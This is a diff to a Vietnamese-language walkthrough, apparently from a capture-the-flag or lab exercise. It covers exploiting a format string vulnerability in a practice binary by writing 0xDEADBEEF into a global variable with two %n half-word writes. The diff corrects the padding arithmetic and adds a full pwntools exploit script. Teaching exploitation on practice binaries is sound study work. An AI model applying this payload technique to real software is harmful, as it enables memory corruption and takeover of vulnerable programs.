@@ -294,7 +294,7 @@ PIE đang tắt tức địa chỉ các biến Global là tĩnh ta chỉ cần d
 
 ![Alt text](image/fs20.png)
 
-Ta đã có địa chỉ check nhưng có 1 lưu ý nhỏ trước khi nhập payload. Hãy thử chuyển `0xDEADBEEF` (hexa) thành hệ 10 (dec) và ta sẽ thấy vấn đề.
+Ta đã có địa chỉ check nhưng có 1 lưu ý nhỏ trước khi nhập payload. Hãy thử chuyển `0xDEADBEEF` (`hexa) thành hệ 10 (dec) và ta sẽ thấy vấn đề.
 
 Để đưa được `0xDEADBEEF` vào vùng nhớ thì ta sẽ cần padding tương đương 3GB, một con số khổng lồ:
 
@@ -307,7 +307,7 @@ Giải pháp là ta chỉ nhập vào 2 BYTE dữ liệu mỗi lần (một nử
 Nhập payload:
 
 	check=0x404090
-	payload=f'%{0xBEEF}c%10$n'.encode()
+	payload=f'%{0xBEEF}c%10$n'.encode()			
 	payload+=f'%{0xDEAD}c%11$n'.encode()
 	payload=payload.ljust(32,b'A')
 	payload+=p64(check)
@@ -320,4 +320,26 @@ Khi bật gdb kiểm tra lại biến check thì bên trong không phải `0xDEA
 
 ![Alt text](image/fs23.png)
 
-Vì `%n` sẽ lấy cả phần padding trước + padding sau rồi cộng lại nên trừ đi phần lặp là cần thiết.
+Vì `%n` sẽ lấy cả phần padding trước và padding sau rồi cộng lại nên dữ liệu nhập vào cuối cùng sai.
+
+Chỉ cần chỉnh lại phần padding sau trừ đi padding trước là `0x19d9c` sẽ quay lại `0xDEAD`.
+
+	payload+=f'%{0xDEAD-0xBEEF}c%11$n'.encode() 
+
+## Script Python
+
+	#!/usr/bin/env python3
+	from pwn import *
+	exe=ELF('./fmtstr5',checksec=False)
+	p=process(exe.path)
+	
+	check=0x404090
+	payload=f'%{0xBEEF}c%10$n'.encode()
+	payload+=f'%{0xDEAD-0xBEEF}c%11$n'.encode()
+	payload=payload.ljust(32,b'A')
+	payload+=p64(check)
+	payload+=p64(check+2)
+	p.sendafter(b'Your format string: ',payload)
+	
+	p.interactive()
+
